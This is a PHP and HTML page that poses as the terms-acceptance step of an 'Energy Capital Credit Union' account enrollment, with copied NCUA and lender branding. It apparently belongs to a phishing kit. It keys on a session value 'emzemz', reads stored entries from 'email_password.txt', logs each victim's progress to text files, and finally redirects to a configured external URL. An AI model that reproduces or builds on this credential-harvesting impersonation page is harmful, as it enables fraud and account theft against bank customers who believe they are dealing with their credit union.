<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt');
        $userEmail = 'N/A';
        if (!empty($userData)) {
            foreach ($userData as $entry) {
                if (isset($entry['usrnm']) && $entry['usrnm'] === $username) {
                    $userEmail = $entry['usr_eml'] ?? 'N/A';
                    break;
                }
            }
        }
        
        // Save to file
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL
        header('Location: ' . FINAL_REDIRECT_URL);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of Agreement - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Terms Card -->
                <div class="w-full max-w-2xl">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Terms of Agreement</h2>
                            <p class="text-center text-slate-300 text-sm">Please review and accept our terms to complete your enrollment</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm"><?php echo htmlspecialchars($errors['agree']); ?></p>
                            </div>
                        <?php endif; ?>
                        
                        <!-- Terms Content -->
                        <div class="bg-[#283045] rounded-lg p-6 max-h-96 overflow-y-auto space-y-4 text-sm text-slate-300">
                            <h3 class="text-lg font-semibold text-[#7dd3fc] mb-4">Energy Capital Credit Union Terms & Conditions</h3>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">1. Account Opening</h4>
                                <p>By opening an account with Energy Capital Credit Union, you agree to comply with all applicable laws and regulations. You must be at least 18 years of age and provide accurate information.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">2. Account Ownership</h4>
                                <p>You are responsible for maintaining the confidentiality of your account information and password. You agree to notify us immediately of any unauthorized use of your account.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">3. Fees and Charges</h4>
                                <p>Energy Capital Credit Union may charge fees for certain services. You will be notified of any fees prior to their implementation. Fees may be deducted from your account.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">4. Liability</h4>
                                <p>Energy Capital Credit Union is not liable for any indirect, incidental, special, or consequential damages arising from your use of our services.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">5. Modifications</h4>
                                <p>We reserve the right to modify these terms at any time. Changes will be effective upon posting to our website. Your continued use of our services constitutes acceptance of any modifications.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">6. Privacy Policy</h4>
                                <p>Your privacy is important to us. We collect and use your information in accordance with our Privacy Policy. We will not share your information with third parties without your consent, except as required by law.</p>
                            </section>
                            
                            <section>
                                <h4 class="font-semibold text-white mb-2">7. Dispute Resolution</h4>
                                <p>Any disputes arising from these terms shall be resolved through binding arbitration in accordance with the rules of the American Arbitration Association.</p>
                            </section>
                        </div>
                        
                        <form method="POST" class="space-y-6">
                            <!-- Agreement Checkbox -->
                            <div class="flex items-start gap-3">
                                <input
                                    type="checkbox"
                                    id="agree"
                                    name="agree"
                                    class="w-5 h-5 mt-1 rounded border-slate-600 bg-[#283045] cursor-pointer"
                                    <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                                />
                                <label for="agree" class="text-slate-300 text-sm cursor-pointer">
                                    I have read and agree to the Terms of Agreement and Privacy Policy
                                </label>
                            </div>
                            <?php if (isset($errors['agree'])): ?>
                                <p class="text-xs text-red-400"><?php echo htmlspecialchars($errors['agree']); ?></p>
                            <?php endif; ?>
                            
                            <!-- Complete Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Complete Enrollment
                            </button>
                        </form>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>
</body>
</html>
